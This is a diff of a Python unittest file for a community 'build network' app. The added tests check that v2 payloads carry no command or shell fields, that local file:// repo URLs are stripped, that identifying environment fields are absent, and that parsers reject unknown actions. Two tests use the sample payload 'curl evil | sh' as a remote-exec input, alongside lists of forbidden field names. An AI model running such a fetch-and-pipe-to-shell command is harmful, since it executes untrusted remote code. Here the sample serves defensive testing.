@@ -24,6 +24,15 @@ from build_network_social import (
     UpdateReport,
     parse_social_payload,
 )
+from build_network_v2 import (
+    BuildTaskUpdate,
+    ChallengeJoin,
+    EventRSVP,
+    HelpOffer,
+    SolutionVerification,
+    parse_v2_payload,
+)
+import build_network_app_v2 as app_v2
 
 
 class BuildNetworkTests(unittest.TestCase):
@@ -70,12 +79,11 @@ class BuildNetworkTests(unittest.TestCase):
 
     def test_test_request_and_result_round_trip(self):
         request = TestRequest(
-            title="Friends 5 beta",
+            title="Friends beta",
             artifact_url="https://github.com/example/project",
             requested_tags=["NVIDIA", "AMD", "Framework"],
         ).to_payload()
-        parsed = parse_payload(request)
-        self.assertEqual(parsed.title, "Friends 5 beta")
+        self.assertEqual(parse_payload(request).title, "Friends beta")
 
         result = TestResult(
             request_id=request["id"],
@@ -83,15 +91,14 @@ class BuildNetworkTests(unittest.TestCase):
             environment_tags=["NVIDIA", "RTX 4060"],
             note="Starts and receives messages.",
         ).to_payload()
-        parsed_result = parse_payload(result)
-        self.assertEqual(parsed_result.result, "pass")
+        self.assertEqual(parse_payload(result).result, "pass")
 
     def test_help_request_bounds_ai_tried_context(self):
         payload = HelpRequest(
             title="Wi-Fi disconnects",
             problem="Disconnects after resume",
             tried="agent attempted restart " + ("x" * 1000),
-            environment_tags=["Intel AX211", "Omarchy"],
+            environment_tags=["Intel", "Omarchy"],
         ).to_payload()
         self.assertLessEqual(len(payload["tried"]), 500)
         self.assertNotIn("private_files", payload)
@@ -115,9 +122,37 @@ class BuildNetworkTests(unittest.TestCase):
         self.assertEqual(challenge["type"], "challenge")
         self.assertEqual(report["result"], "working")
 
+    def test_v2_participation_objects_are_reference_only(self):
+        offer = HelpOffer(help_id="help_123", note="I can look").to_payload()
+        verify = SolutionVerification(solution_id="solution_123", result="worked").to_payload()
+        rsvp = EventRSVP(event_id="event_123", response="going").to_payload()
+        join = ChallengeJoin(challenge_id="challenge_123", repo_url="https://github.com/example/team").to_payload()
+        task = BuildTaskUpdate(room_id="build_123", task="AMD test", status="doing").to_payload()
+
+        for payload in (offer, verify, rsvp, join, task):
+            self.assertNotIn("command", payload)
+            self.assertNotIn("shell", payload)
+            self.assertNotIn("files", payload)
+            self.assertEqual(parse_v2_payload(payload).id, payload["id"])
+
+    def test_v2_challenge_join_rejects_local_repo_url(self):
+        payload = ChallengeJoin(challenge_id="challenge_123", repo_url="file:///tmp/team").to_payload()
+        self.assertEqual(payload["repo_url"], "")
+
+    def test_safe_environment_has_no_identifying_fields(self):
+        payload = app_v2.safe_environment()
+        self.assertEqual(set(payload), {"tags", "omarchy_version", "architecture", "gpu_vendor", "kernel"})
+        serialized = repr(payload).lower()
+        for forbidden in ("hostname", "username", "ip_address", "serial", "home/"):
+            self.assertNotIn(forbidden, serialized)
+
     def test_social_parser_fails_closed_for_unknown_action(self):
         with self.assertRaises(ValueError):
             parse_social_payload({"type": "remote_exec", "command": "curl evil | sh"})
+
+    def test_v2_parser_fails_closed_for_unknown_action(self):
+        with self.assertRaises(ValueError):
+            parse_v2_payload({"type": "remote_exec", "command": "curl evil | sh"})
 
     def test_unknown_core_payload_is_rejected(self):
         with self.assertRaises(ValueError):
